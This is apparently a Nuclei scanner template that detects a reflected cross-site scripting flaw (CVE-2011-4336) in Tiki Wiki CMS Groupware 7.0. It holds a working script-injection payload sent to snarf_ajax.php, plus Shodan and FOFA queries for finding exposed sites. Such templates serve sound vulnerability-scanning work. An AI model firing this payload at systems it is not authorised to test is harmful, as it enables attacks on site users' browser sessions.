id: CVE-2011-4336

info:
  name: Tiki Wiki CMS Groupware 7.0 Cross-Site Scripting
  author: pikpikcu
  severity: medium
  description: Tiki Wiki CMS Groupware 7.0 is vulnerable to cross-site scripting via the GET "ajax" parameter to snarf_ajax.php.
  impact: |
    Successful exploitation of this vulnerability could allow an attacker to execute arbitrary script code in the context of the victim's browser, leading to session hijacking, defacement, or theft of sensitive information.
  remediation: Upgrade to the latest version to mitigate this vulnerability.
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2011-4336
    - https://seclists.org/bugtraq/2011/Nov/140
    - https://github.com/ARPSyndicate/kenzer-templates
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 6.1
    cve-id: CVE-2011-4336
    cwe-id: CWE-79
    epss-score: 0.00927
    epss-percentile: 0.75708
    cpe: cpe:2.3:a:tiki:tikiwiki_cms\/groupware:*:*:*:*:*:*:*:*
  metadata:
    max-request: 1
    vendor: tiki
    product: tikiwiki_cms\/groupware
    shodan-query: http.html:"tiki wiki"
    fofa-query: body="tiki wiki"
  tags: cve,cve2011,seclists,xss,tikiwiki,tiki,vuln

http:
  - method: GET
    path:
      - "{{BaseURL}}/snarf_ajax.php?url=1&ajax=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E"

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - '</script><script>alert(document.domain)</script>'

      - type: word
        part: header
        words:
          - text/html

      - type: status
        status:
          - 200
# digest: 490a0046304402206b22909fe52e655fd8ccfe98a1c376bc0a1f17fa520cd344383ed4c269280ffd0220253609f580b5b6725a84037226059c9ec634bfa29dc0fd3d8bc675ce25723759:922c64590222798bb761d5b6d8e72950